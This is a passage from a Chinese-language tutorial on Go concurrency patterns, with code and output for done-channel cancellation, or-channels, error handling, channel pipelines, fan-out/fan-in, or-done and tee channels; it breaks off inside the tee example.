doWork。因此，字符串channel永远不会写入任何字符串，并且包含doWork的goroutine将在此过程的整个生命周期中保留在内存中（如果我们在doWork和main goroutine中加入了goroutine,甚至会死锁)。在这个例子中，这个过程的生命周期很短，但是在一个真正的程序中，goroutine可以很容易地在一个长期生命的程序开始时启动。在最糟糕的情况下，main goroutine 可能会在其生命周期内持续的将其他的 goroutine 设置为自旋，这会导致内存利用率的下降。\n成功减轻这种情况的方法是在父goroutine和其子goroutine之间建立一个信号，让父goroutine向其子goroutine发出信号通知。按照惯例，这个信号通常是一个名为done的只读channel。父goroutine将该channel传递给子goroutine,然后在想要取消子goroutine时关闭该channel。例如：\npackage mainimport (\t\"fmt\"\t\"time\")func main() {\tdoWork := func(\t// 在这里，我们将完成的channel传递给doWork函数。作为惯例，这个 channel 是第一个参数。\t\tdone &lt;-chan any,\t\tstrings &lt;-chan string,\t) &lt;-chan any {\t\tterminated := make(chan any)\t\tgo func() {\t\t\tdefer fmt.Println(\"dowork exited.\")\t\t\tdefer close(terminated)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase s := &lt;-strings:\t\t\t\t\t//做一些有意思的操作\t\t\t\t\tfmt.Println(s)\t\t\t\tcase &lt;-done: // 在这一行上，我们看到了在实际编程中无处不在的select模式。我们的一个案例陈述是检查我们的done channel是否已经发出信号。如果有的话，我们从goroutine返回。\t\t\t\t\treturn\t\t\t\t}\t\t\t}\t\t}()\t\treturn terminated\t}\tdone := make(chan any)\tterminated := doWork(done, nil)\t// 在这里我们创建另一个goroutine,如果超过1s就会取消doWork中产生的goroutine.\tgo func() {\t\t// 在1秒之后取消本操作\t\ttime.Sleep(1 * time.Second)\t\tfmt.Println(\"Canceling dowork goroutine...\")\t\tclose(done)\t}()\t&lt;-terminated\tfmt.Println(\"Done.\")}\n\n输出如下:\nCanceling dowork goroutine...dowork exited.Done.\n\n这可以成功地消除 goroutine 的泄漏。\n前面的例子很好地处理了在channel上接收goroutine的情况，但是如果我们正在处理相反的情况：一个goroutine阻塞了向channel进行写入的请求？以下是演示此问题的简单示例：\npackage mainimport (\t\"fmt\"\t\"math/rand\")func main() {\tnewRandStream := func() &lt;-chan int {\t\trandStream := make(chan int)\t\tgo func() {\t\t\tdefer fmt.Println(\"newRandStream closure exited.\") // 这里我们在goroutine成功终止时打印出一条消息。\t\t\tdefer close(randStream)\t\t\tfor {\t\t\t\trandStream &lt;- rand.Int()\t\t\t}\t\t}()\t\treturn randStream\t}\trandStream := newRandStream()\tfmt.Println(\"3 random ints:\")\tfor i := 1; i &lt;= 3; i++ {\t\tfmt.Printf(\"%d: %d\\n\", i, &lt;-randStream)\t}}\n\n输出如下:\n3 random ints:1: 36553052118680550392: 12495782735126891963: 5508016884678521403\n\n可以从输出中看到defer语句中的fmt.Println语句永远不会运行。在循环的第三次迭代之后，我们的goroutine试图将下一个随机整数发送到不再被读取的channel。我们无法告诉生产者它可以停止。解决方案就像接收案例一样，为生产者goroutine提供一个通知它退出的channel:\npackage mainimport (\t\"fmt\"\t\"math/rand\"\t\"time\")func main() {\tnewRandStream := func(done &lt;-chan any) &lt;-chan int {\t\trandStream := make(chan int)\t\tgo func() {\t\t\tdefer fmt.Println(\"newRandStream closure exited.\") // 这里我们在goroutine成功终止时打印出一条消息。\t\t\tdefer close(randStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase randStream &lt;- rand.Int():\t\t\t\t\t// ...\t\t\t\t}\t\t\t}\t\t}()\t\treturn randStream\t}\tdone := make(chan any)\trandStream := newRandStream(done)\tfmt.Println(\"3 random ints:\")\tfor i := 1; i &lt;= 3; i++ {\t\tfmt.Printf(\"%d: %d\\n\", i, &lt;-randStream)\t}\tclose(done)\t// 模拟耗时操作\ttime.Sleep(1 * time.Second)}\n\n输出如下:\n3 random ints:1: 62353269248592060752: 59554756840251826163: 8355754141677034465newRandStream closure exited.\n\n现在goroutine已经被正确地清理了。\n现在我们知道如何确保goroutine不泄漏，我们可以规定一个约定：如果 goroutine 负责创建 goroutine,它也负责确保它可以停止 goroutine。这个约定有助于确保你的程序在组合和扩展时可以扩展。\nor-channel有时你可能会发现自己希望将一个或多个完成的 channel 合并到一个完成的 channel 中，该 channel 在任何组件 channel 关闭时关闭。编写一个执行这种耦合的选择语句是完全可以接受的，尽管很冗长。但是，有时你无法知道你在运行时使用的已完成的channel的数量。在这种情况下，或者如果你只喜欢单线程，你可以使用or-channel模式将这些channel组合在一起。\n这种模式通过递归和goroutine创建一个复合done channel。我们来看一下：\npackage mainfunc main() {\tvar or func(channels ...&lt;-chan any) &lt;-chan any\tor = func(channels ...&lt;-chan any) &lt;-chan any { // 在这里，我们有我们的函数，或者，它采用可变的channel切片并返回单个channel\t\tswitch len(channels) {\t\tcase 0: // 由于这是一个递归函数，我们必须设置终止标准。首先，如果可变切片是空的，我们只返回一个空channel。这是由于不传递channel的观点所产生的，我们不希望复合的channel做任何事情.\t\t\treturn nil\t\tcase 1: // 我们的第二个终止标准是如果我们的变量切片只包含一个元素，我们只返回该元素。\t\t\treturn channels[0]\t\t}\t\torDone := make(chan any)\t\tgo func() { // 这是函数的主体，以及递归发生的地方。我们创建了一个goroutine,以便我们可以不受阻塞地等待我们channel上的消息。\t\t\tdefer close(orDone)\t\t\tswitch len(channels) {\t\t\tcase 2: // // 基于我们进行迭代的方式，每一次迭代调用都将至少有两个channel。在这里我们为需要两个channel的情况采用了约束goroutine数目的优化方法。\t\t\t\tselect {\t\t\t\tcase &lt;-channels[0]:\t\t\t\tcase &lt;-channels[1]:\t\t\t\t}\t\t\tdefault:\t\t\t\tselect {\t\t\t\tcase &lt;-channels[0]:\t\t\t\tcase &lt;-channels[1]:\t\t\t\tcase &lt;-channels[2]:\t\t\t\tcase &lt;-or(append(channels[3:], orDone)...): // 在这里，我们在循环到我们存放所有channel的slice的第三个索引的时候，我们创建了一个or-channel并从这个channel中选择了一个。这将形成一个由现有slice的剩余部分组成的树并且返回第一个信号量。为了使在建立这个树的goroutine退出的时候在树下的goroutine也可以跟着退出，我们将这个orDone channel也传递到了调用中。\t\t\t\t}\t\t\t}\t\t}()\t\treturn orDone\t}}\n\n这是一个相当简洁的函数，使你可以将任意数量的channel组合到单个channel中，只要任何组件channel关闭或写入，该channel就会关闭。下面是个简短的例子，它将经过一段时间后关闭的channel，并将这些channel合并到一个关闭的单个channel中：\npackage mainimport (\t\"fmt\"\t\"time\")func main() {\tsig := func(after time.Duration) &lt;-chan any {\t\tc := make(chan any)\t\tgo func() {\t\t\tdefer close(c)\t\t\ttime.Sleep(after)\t\t\tc &lt;- struct{}{}\t\t}()\t\treturn c\t}\tstart := time.Now()\t&lt;-or(\t\tsig(2*time.Hour),\t\tsig(5*time.Minute),\t\tsig(1*time.Second),\t\tsig(1*time.Hour),\t\tsig(1*time.Minute),\t)\tfmt.Printf(\"done after %v\\n\", time.Since(start))}\n\n输出如下：done after 1.0107002s\n请注意，尽管在我们的调用中放置了多个channel或需要不同时间才能关闭，但我们在1s后关闭的channel会导致由该调用创建的整个channel关闭。这是因为尽管它位于树或函数构建的树中，它将始终关闭，因此依赖于其关闭的channel也将关闭。\n我们以附加的goroutine为代价来实现这个简洁性，,其中x是goroutine的数量，但要记住Go语言的一个优点是能够快速创建，调度和运行goroutine,并且该语言积极鼓励使用goroutine来正确建模问题。担心在这里创建的goroutine的数量可能是一个不成熟的优化。此外，如果在编译时你不知道你正在使用多少个“done channel”,则将会没有其他方式可以合并“done channel”\n这种模式在你的系统中的模块交汇处非常有用。在这些交汇处，你的调用堆中应该有复数种的用来取消goroutine的决策树。使用or函数，你可以简单地将它们组合在一起并将其传递给堆栈。我们将在本章后面“context包”中看到另一种做法，这也很好，也许更具描述性。\n错误处理在并发程序中，错误处理可能难以正确进行。有时候，我们花了很多时间思考我们的各种 stage 如何共享信息和进行协调，我们忘记考虑它们如何优雅地处理错误的状态。当G0语言避开了流行的错误异常模型时，它声明错误处理非常重要，并且在开发我们的程序时，我们应该给出我们的错误路径给予我们的算法同样的关注。本着这种精神，让我们来看看在处理多个并发进程时我们如何做到这一点。\n思考错误处理时最根本的问题是，“谁应该负责处理错误？”在某些时候，程序需要停止将错误输出来，并且实际上对它做了些什么。这么做的目的是什么？\n在并发进程中，这个问题变得更复杂一些。因为并发进程独立于其父进程或兄弟进程运行，所以它可能很难推断出错是正确的。goroutine没有选择。它不能简单地吞下错误，因此它只能做出明智的事情：它会打印错误并希望某些内容被关注。一般来说，你的并发进程应该把他们的错误发送到你的程序的另一部分，它有你的程序状态的完整信息，并可以做出更明智的决定做什么。下面的例子，会在出现三个或更多错误时停止尝试检查状态：\npackage mainimport (\t\"fmt\"\t\"net/http\")func main() {\ttype Result struct {\t\tResponse *http.Response\t\tError    error\t}\tcheckStatus := func(done &lt;-chan any, urls ...string) &lt;-chan Result {\t\tresponses := make(chan Result)\t\tgo func() {\t\t\tdefer close(responses)\t\t\tfor _, url := range urls {\t\t\t\tresp, err := http.Get(url)\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase responses &lt;- Result{Response: resp, Error: err}:\t\t\t\t}\t\t\t}\t\t}()\t\treturn responses\t}\tdone := make(chan any)\tdefer close(done)\terrCount := 0\turls := []string{\"a\", \"https://www.google.com\", \"b\", \"c\", \"d\"}\tfor result := range checkStatus(done, urls...) {\t\tif result.Error != nil {\t\t\tfmt.Printf(\"error: %v\\n\", result.Error)\t\t\terrCount++\t\t\tif errCount &gt;= 3 {\t\t\t\tfmt.Println(\"Too many errors,breaking!\")\t\t\t\tbreak\t\t\t}\t\t\tcontinue\t\t}\t\tfmt.Printf(\"Response:%v\\n\", result.Response.Status)\t}}\n\n输出如下：\nerror: Get \"a\": unsupported protocol scheme \"\"Response:200 OKerror: Get \"b\": unsupported protocol scheme \"\"error: Get \"c\": unsupported protocol scheme \"\"Too many errors,breaking!\n\n因为错误是从checkStatus返回的而不是在goroutine内部处理的，错误处理遵循熟悉的G0语言模式。这是一个简单的例子，但不难想象，main goroutine正在协调多个goroutine的结果，并制定更复杂的规则来继续或取消子goroutine.。此外，这里的主要内容是，在构建从goroutine返回值时，应将错误视为一等公民。如果你的goroutine可能产生错误，那么这些错误应该与你的结果类型紧密结合，并且通过相同的通信线传递，就像常规的同步函数一样。\npipelinepipeline 是可以用来在系统中形成抽象的一种工具。特别是，当你的程序需要流式处理或批处理数据时，它是一个非常强大的工具。pipeline这个词据称是在1856年首次使用的，可能是指将液体从一个地方输送到另一个地方的一系列管道。我们在计算机科学中借用了这个术语，因为我们也在从一个地方向另一个地方传输某些东西：数据。pipeline只不过是一系列将数据输入，执行操作并将结果数据传回的系统。我们称这些操作都是pipeline的一个stage。\n通过使用pipeline,你可以分离每个stage的关注点，这提供了许多好处。你可以相互独立地修改各个stage,你可以混合搭配stage的组合方式，而无需修改stage,你可以将每个stage同时处理到上游或下游stage,并且可以扇出或限制部分你的pipeline。\n让我们从简单的开始，尝试构建一个pipeline的stage。如前所述，一个stage只是将数据输入，对其进行转换并将数据发回。下面是一个可以被视为pipeline stage的函数的例子：\npackage mainimport \"fmt\"func main() {\tmultiply := func(values []int, multiplier int) []int {\t\tmultipliedValues := make([]int, len(values))\t\tfor i, v := range values {\t\t\tmultipliedValues[i] = v * multiplier\t\t}\t\treturn multipliedValues\t}\tadd := func(values []int, adder int) []int {\t\taddedValues := make([]int, len(values))\t\tfor i, v := range values {\t\t\taddedValues[i] = v + adder\t\t}\t\treturn addedValues\t}\tints := []int{1, 2, 3, 4, 5}\tfor _, v := range add(multiply(ints, 2), 1) {\t\tfmt.Println(v)\t}}\n\n输出如下：\n357911\n\n看看我们如何在range子句中结合添加和乘法。这些函数就像你每天工作的函数一样，但是因为我们将它们构建为具有pipeline stage的属性，所以我们可以将它们组合起来形成一个pipeline。那很有意思，pipeline stage的属性是什么？\n\n一个stage消耗并返回相同的类型.\n一个stage必须用语言来表达，以便它可以被传递。Go语言中的功能已被证实，并很好地适用于此目的。\n\n事实上，pipeline stage与函数式编程密切相关，可以被认为是 monad 的一个子集。我不会在这里明确地讨论monad或函数式编程，但它们本身就是一个有趣的主题，并且在尝试理解pipeline时，对这两个主题的工作知识虽然不必要，但是有用。在这里，我们的add和multiply stage满足pipeline stage的所有属性：它们都消耗一个int切片并返回一个int切片，并且因为Go语言具有函数化功能，所以我们可以传递add和multiply。这些属性引起了我们前面提到的 pipeline stage 的有趣特性，即在不改变stage本身的情况下，将我们的 stage 结合到更高层次变得非常容易。\n例如，如果我们现在想要为pipeline添加一个额外的stage来乘以2，我们只需将我们以前的pipeline包装在一个新的乘法stage,如下所示：\nints := []int{1, 2, 3, 4, 5}for _, v := range multiply(add(multiply(ints, 2), 1), 2) {\tfmt.Println(v)}\n\n最初，这看起来简单得多，但正如我们看到的那样，程序代码在处理数据流时不会提供与pipeline相同的好处。请注意每个stage是如何获取切片数据并返回切片数据的？这些stage正在执行我们称作批处理的操作。这意味若它们仅对大块数据进行一次操作，而不是一次一个离散值。还有另一种类型的pipeline stage执行流处理。这意味着这个stage一次只接收和处理一个元素。\n批处理和流处理有优点和缺点，我们将稍微讨论一下。现在，请注意，为使原始数据保持不变，每个stage都必须创建一个等长的新片段来存储其计算结果。这意味着我们程序在任何时候的内存占用量都是我们发送到我们 pipeline 开始处的片大小的两倍。让我们将我们的stage转换为以流为导向，看起来如下所示：\npackage mainimport \"fmt\"func main() {\tmultiply := func(value int, multiplier int) int {\t\treturn value * multiplier\t}\tadd := func(value int, adder int) int {\t\treturn value + adder\t}\tints := []int{1, 2, 3, 4, 5}\tfor _, v := range ints {\t\tfmt.Println(add(multiply(v, 2), 1))\t}}\n\n每个stage都接收并发出一个离散值，我们的程序的内存占用空间将回落到只有pipeline输入的大小。但是我们不得不将pipeline写入到for循环的体内，并让range语句为我们的pipeline进行繁重的提升。这不仅限制了我们供应pipeline的重复使用，这也限制了我们的扩展能力。\n还有其他问题。实际上，我们正在为循环的每次迭代实例化我们的pipeline。尽管进行函数调用代价很低，但我们为循环的每次迭代进行三次函数调用。并发性又如何？我前面说过，使用pipeline的好处之一是能够同时处理各个stage,并且我提到了一些关于扇出(fan-out)的内容。所有进来的地方在哪里？\n构建 pipeline 的最佳实践channel非常适合在Go语言中构建pipeline,因为它们满足了我们所有的基本要求。它们可以接受和产生值，可以安全地同时使用，还可以被放弃，它们被语言所证实。让我们花点时间转换一下前面的例子来改用channel:\npackage mainfunc main() {\tgenerator := func(done &lt;-chan any, integers ...int) &lt;-chan int {\t\tintStream := make(chan int)\t\tgo func() {\t\t\tdefer close(intStream)\t\t\tfor _, i := range integers {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase intStream &lt;- i:\t\t\t\t}\t\t\t}\t\t}()\t\treturn intStream\t}\tmultiply := func(done &lt;-chan any, intStream &lt;-chan int, multiplier int) &lt;-chan int {\t\tmultipliedStream := make(chan int)\t\tgo func() {\t\t\tdefer close(multipliedStream)\t\t\tfor i := range intStream {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase multipliedStream &lt;- i * multiplier:\t\t\t\t}\t\t\t}\t\t}()\t\treturn multipliedStream\t}\tadd := func(done &lt;-chan any, intStream &lt;-chan int, additive int) &lt;-chan int {\t\tsummedStream := make(chan int)\t\tgo func() {\t\t\tdefer close(summedStream)\t\t\tfor i := range intStream {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase summedStream &lt;- i + additive:\t\t\t\t}\t\t\t}\t\t}()\t\treturn summedStream\t}\tdone := make(chan any)\tdefer close(done)\tintStream := generator(done, 1, 2, 3, 4)\tpipeline := multiply(done, add(done, intStream, 1), 2)\tfor v := range pipeline {\t\tprintln(v)\t}}\n\n输出如下：\n46810\n\n我们得到了期望的输出。它们都看起来像是在他们的函数体内开始了一个goroutine，通过一个channel表示该goroutine应该退出。这里使用了我们前面“防止goroutine泄漏”中建立的模式。它们看起来都像是返回channel,其中一些看起来像是在另外一个channel中。\ngenerator 函数接受一个可变的整数切片，构造一个缓存长度等于输入整数片段的整数channel,启动一个goroutine并返回构造的channel。然后，在创建的goroutine上，generator函数使用range语句遍历传入的可变切片，并在其创建的channel上发送切片的值。请注意，channel上的发送与完成channel上的选择共享一条select语句。再一次，使用了前面“防止goroutine泄漏”中建立的模式，以防止泄漏goroutines。\n简而言之，generator函数将一组离散值转换为一个channel上的数据流。适当地说，这种类型的功能称为生成器。在使用流水线时，你会经常看到这一点，因为在流水线开始时，你总是会有一些需要转换为channel的数据。\n这里的channel与前面例子中使用函数的channel有些不同之处。首先，我们正在使用pipeline。这是显而易见的，因为它允许两件事情：在我们的pipeline的末尾，我们可以使用范围语句来提取值，并且在每个stage我们可以安全地同时执行，因为我们的输入和输出在并发上下文中是安全的。这给我们带来了第二个不同之处：pipeline的每个stage都在执行控制。这意味着任何stage只需要等待其输入，并且能够发送其输出。事实证明，这会产生巨大的影响。可以注意到它允许我们的stage相互独立地执行某个片段时间。\n\npipeline中，每个stage都会接收done channel。即case &lt;-done: return控制语句。任何时候关闭 done channel，所有 stage 都会立即终止。同时每个 stage 都会在退出前关闭自己管理的 channel defer close(stream)，避免 goroutine 泄漏。最后每个 stage 的抢占性依赖于上游 stage 的抢占性 for i := range stream，最终形成一个递归关系。\n很妙。书中的描述我没看懂，但就是环环相扣保证我们可以随时终止整个pipeline，而不会导致资源泄漏或阻塞。\n\n一些便利的生成器pipeline的生成器是将一组离散值转换为channel上的值流的任何函数。\n我们来看看一个名为 repeat 的生成器：\npackage mainimport \"fmt\"func main() {\trepeat := func(done &lt;-chan any, values ...any) &lt;-chan any {\t\tvalueStream := make(chan interface{})\t\tgo func() {\t\t\tdefer close(valueStream)\t\t\tfor {\t\t\t\tfor _, v := range values {\t\t\t\t\tselect {\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\treturn\t\t\t\t\tcase valueStream &lt;- v:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn valueStream\t}\ttake := func(done &lt;-chan any, valueStream &lt;-chan any, num int) &lt;-chan any {\t\ttakeStream := make(chan any)\t\tgo func() {\t\t\tdefer close(takeStream)\t\t\tfor i := 0; i &lt; num; i++ {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase takeStream &lt;- &lt;-valueStream:\t\t\t\t}\t\t\t}\t\t}()\t\treturn takeStream\t}\tdone := make(chan any)\tdefer close(done)\tfor v := range take(done, repeat(done, 1), 10) {\t\tfmt.Printf(\"%v \", v)\t}}\n\n输出如下：1 1 1 1 1 1 1 1 1 1 \n这段代码展示了 Go 语言中 pipeline 模式的另一种实现方式，结合了 repeat 和 take 两个 stage，用于生成重复的值并从中取出指定数量的值。下面我们逐步分析代码的功能和运行机制。\n\nrepeat 函数：生成一个无限重复的流，将传入的值循环发送到 channel 中。\ntake 函数：从传入的 channel 中取出指定数量的值，然后关闭 channel。\nmain 函数：组合 repeat 和 take，生成一个重复的值流，并从中取出前 10 个值。\n\n我们可以扩展这一点。让我们创建另一个重复的生成器，但是这次我们创建一个重复调用函数的生成器。我们称之为repeatFn:\npackage mainimport (\t\"fmt\"\t\"math/rand/v2\")func main() {\trepeatFn := func(done &lt;-chan any, fn func() any) &lt;-chan any {\t\tvalueStream := make(chan any)\t\tgo func() {\t\t\tdefer close(valueStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase valueStream &lt;- fn():\t\t\t\t}\t\t\t}\t\t}()\t\treturn valueStream\t}\ttake := func(done &lt;-chan any, valueStream &lt;-chan any, num int) &lt;-chan any {\t\ttakeStream := make(chan any)\t\tgo func() {\t\t\tdefer close(takeStream)\t\t\tfor i := 0; i &lt; num; i++ {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase takeStream &lt;- &lt;-valueStream:\t\t\t\t}\t\t\t}\t\t}()\t\treturn takeStream\t}\tdone := make(chan any)\tdefer close(done)\trand := func() any {\t\treturn rand.Int()\t}\tfor v := range take(done, repeatFn(done, rand), 10) {\t\tfmt.Println(v)\t}}\n\n这非常酷，一个根据需要生成随机整数的无限channel（确实，从未有过的想法\n一般来说，pipeline上的限制因素将是你的生成器，或者是计算密集型的一个stage。如果生成器不像repeat和repeatFn生成器那样从内存中创建流，则可能会受/O限制。如果一个stage计算成本很高，我们该如何帮助缓解这个问题呢？它不会限制整个pipeline的速度吗？为了缓解这种情况，让我们来讨论扇出扇入(fan-out,fan-in)技术。\n扇入、扇出扇入（Fan-In） 和 扇出（Fan-Out） 是并发编程中的两种常见模式，用于描述数据流的合并和分发。它们在处理多任务、多数据源或多消费者场景时非常有用。\n扇出是指将 一个输入流分发给多个处理单元（goroutine），以实现并行处理。扇出模式通常用于提高任务的处理效率。在某个stage在计算上特别昂贵时，可以使用扇出，增加处理单元来提高效率。防止上游阻塞。\n扇入是指将 多个输入流合并为一个输出流。扇入模式通常用于将多个 goroutine 的结果汇总。\n扇入和扇出通常结合使用，以实现高效的并发处理。例如下面的代码，首先创建一个无限的随机数生成器，并使用多个stage计算其是否为素数（耗时操作），然后使用fanIn将计算结果进行合并，最后take取出前10个结果：\npackage mainimport (\t\"fmt\"\t\"math/rand\"\t\"runtime\"\t\"sync\"\t\"time\")func main() {\trepeatFn := func(done &lt;-chan any, fn func() any) &lt;-chan any {\t\tvalueStream := make(chan any)\t\tgo func() {\t\t\tdefer close(valueStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase valueStream &lt;- fn():\t\t\t\t}\t\t\t}\t\t}()\t\treturn valueStream\t}\ttake := func(done &lt;-chan any, valueStream &lt;-chan any, num int) &lt;-chan any {\t\ttakeStream := make(chan any)\t\tgo func() {\t\t\tdefer close(takeStream)\t\t\tfor i := 0; i &lt; num; i++ {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase takeStream &lt;- &lt;-valueStream:\t\t\t\t}\t\t\t}\t\t}()\t\treturn takeStream\t}\ttoInt := func(done &lt;-chan any, valueStream &lt;-chan any) &lt;-chan int {\t\tintStream := make(chan int)\t\tgo func() {\t\t\tdefer close(intStream)\t\t\tfor v := range valueStream {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase intStream &lt;- v.(int):\t\t\t\t}\t\t\t}\t\t}()\t\treturn intStream\t}\tprimeFinder := func(done &lt;-chan any, intStream &lt;-chan int) &lt;-chan any {\t\tprimeStream := make(chan any)\t\tgo func() {\t\t\tdefer close(primeStream)\t\t\tfor integer := range intStream {\t\t\t\tinteger -= 1\t\t\t\tprime := true\t\t\t\tfor divisor := integer - 1; divisor &gt; 1; divisor-- {\t\t\t\t\tif integer%divisor == 0 {\t\t\t\t\t\tprime = false\t\t\t\t\t\tbreak\t\t\t\t\t}\t\t\t\t}\t\t\t\tif prime {\t\t\t\t\tselect {\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\treturn\t\t\t\t\tcase primeStream &lt;- integer:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn primeStream\t}\tfanIn := func(done &lt;-chan any, channels ...&lt;-chan any) &lt;-chan any {\t\tvar wg sync.WaitGroup\t\tmultiplexedStream := make(chan any)\t\tmultiplex := func(c &lt;-chan any) {\t\t\tdefer wg.Done()\t\t\tfor i := range c {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase multiplexedStream &lt;- i:\t\t\t\t}\t\t\t}\t\t}\t\t// Select from all the channels\t\twg.Add(len(channels))\t\tfor _, c := range channels {\t\t\tgo multiplex(c)\t\t}\t\t// Wait for all the reads to complete\t\tgo func() {\t\t\twg.Wait()\t\t\tclose(multiplexedStream)\t\t}()\t\treturn multiplexedStream\t}\tdone := make(chan any)\tdefer close(done)\tstart := time.Now()\trand := func() any { return rand.Intn(50000000) }\trandIntStream := toInt(done, repeatFn(done, rand))\tnumFinders := runtime.NumCPU()\tfmt.Printf(\"Spinning up %d prime finders.\\n\", numFinders)\tfinders := make([]&lt;-chan any, numFinders)\tfmt.Println(\"Primes:\")\tfor i := 0; i &lt; numFinders; i++ {\t\tfinders[i] = primeFinder(done, randIntStream)\t}\tfor prime := range take(done, fanIn(done, finders...), 10) {\t\tfmt.Printf(\"\\t%d\\n\", prime)\t}\tfmt.Printf(\"Search took: %v\", time.Since(start))}\n\n输出如下：\nSpinning up 20 prime finders.Primes:\t8768423\t31296637\t37026001\t11348221\t32732303\t1481477\t46401169\t49287157\t10097783\t27371681Search took: 488.1048ms\n\n\n\n\n模式\n描述\n应用场景\n\n\n\n扇出\n将输入流分发给多个处理单元（goroutine）\n并行处理任务\n\n\n扇入\n将多个输入流合并为一个输出流\n汇总多个任务的结果\n\n\n扇入和扇出是并发编程中非常强大的工具，能够有效提高程序的性能和可扩展性。感觉有些类似大数据处理中的 map 和 reduce\nor-done-channel有时候，你需要处理来自系统各个分散部分的channel。与pipeline所不同的是，你不能对一个被done channel所取消的channel将会进行什么行为做任何的断言。也就是说，你不知道你的goroutine是否被取消，这意味着你正在读取的channel将被取消。出于这个原因，正如在本章前面“防止goroutine泄漏”中所阐述的那样，我们需要用channel中的select语句来包装我们的读操作，并从已完成的channel中进行选择。会写出这样的封 orDone：\npackage mainimport (\t\"fmt\"\t\"math/rand\")func main() {\torDone := func(done, c &lt;-chan any) &lt;-chan any {\t\tvalStream := make(chan any)\t\tgo func() {\t\t\tdefer close(valStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase v, ok := &lt;-c:\t\t\t\t\tif ok == false {\t\t\t\t\t\treturn\t\t\t\t\t}\t\t\t\t\tselect {\t\t\t\t\tcase valStream &lt;- v:\t\t\t\t\tcase &lt;-done:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn valStream\t}\trepeatFn := func(done &lt;-chan any, fn func() any) &lt;-chan any {\t\tvalueStream := make(chan any)\t\tgo func() {\t\t\tdefer close(valueStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase valueStream &lt;- fn():\t\t\t\t}\t\t\t}\t\t}()\t\treturn valueStream\t}\ttake := func(done &lt;-chan any, valueStream &lt;-chan any, num int) &lt;-chan any {\t\ttakeStream := make(chan any)\t\tgo func() {\t\t\tdefer close(takeStream)\t\t\tfor i := 0; i &lt; num; i++ {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase takeStream &lt;- &lt;-valueStream:\t\t\t\t}\t\t\t}\t\t}()\t\treturn takeStream\t}\tdone := make(chan any)\tstream := take(done, repeatFn(done, func() any { return rand.Int() }), 10)\tfor val := range orDone(done, stream) {\t\tfmt.Println(val)\t}}\n\ntee-channel有时候你可能想分制一个来自channel的值，以便将它们发送到你的代码的两个独立区域中。设想一下，一个传递用户指令的channel:你可能想要在一个 channel 上接收一系列用户指令，将它们发送给相应的执行器，并将它们发送给记录命令以供日后审计的东西。\n从类UNIX系统中的 tee 命令中获得它的名字，tee-channel 就是这样做的。你可以将它传递给一个读channel,并且它会返回两个单独的channel,以获得相同的值：\npackage mainimport (\t\"fmt\")func main() {\trepeat := func(done &lt;-chan interface{}, values ...interface{}) &lt;-chan interface{} {\t\tvalueStream := make(chan interface{})\t\tgo func() {\t\t\tdefer close(valueStream)\t\t\tfor {\t\t\t\tfor _, v := range values {\t\t\t\t\tselect {\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\treturn\t\t\t\t\tcase valueStream &lt;- v:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn valueStream\t}\ttake := func(done &lt;-chan interface{}, valueStream &lt;-chan interface{}, num int) &lt;-chan interface{} {\t\ttakeStream := make(chan interface{})\t\tgo func() {\t\t\tdefer close(takeStream)\t\t\tfor i := 0; i &lt; num; i++ {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase takeStream &lt;- &lt;-valueStream:\t\t\t\t}\t\t\t}\t\t}()\t\treturn takeStream\t}\torDone := func(done, c &lt;-chan interface{}) &lt;-chan interface{} {\t\tvalStream := make(chan interface{})\t\tgo func() {\t\t\tdefer close(valStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase v, ok := &lt;-c:\t\t\t\t\tif ok == false {\t\t\t\t\t\treturn\t\t\t\t\t}\t\t\t\t\tselect {\t\t\t\t\tcase valStream &lt;- v:\t\t\t\t\tcase &lt;-done:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn valStream\t}\ttee := func(done &lt;-chan interface{}, in &lt;-chan interface{}) (_, _ &lt;-chan interface{}) {\t\tout1 := make(chan interface{})\t\tout2 := make(chan interface{})\t\tgo func() {\t\t\tdefer close(out1)\t\t\tdefer close(out2)\t\t\tfor val := range orDone(done, in) {\t\t\t\tvar out1, out2 = out1, out2 // 使用out1和out2的本地版本。\t\t\t\tfor i := 0; i &lt; 2; i++ {\t\t\t\t\t// 使用se1ect语句，以便不阻塞的写入out1和out2。为确保两者都写入，将执行select语句的两次迭代：每个出站一个channel。\t\t\t\t\tselect {\t\t\t\t\tcase &lt;-done:\t\t\t\t\tcase out1 &lt;- val:\t\t\t\t\t\tout1 = nil // 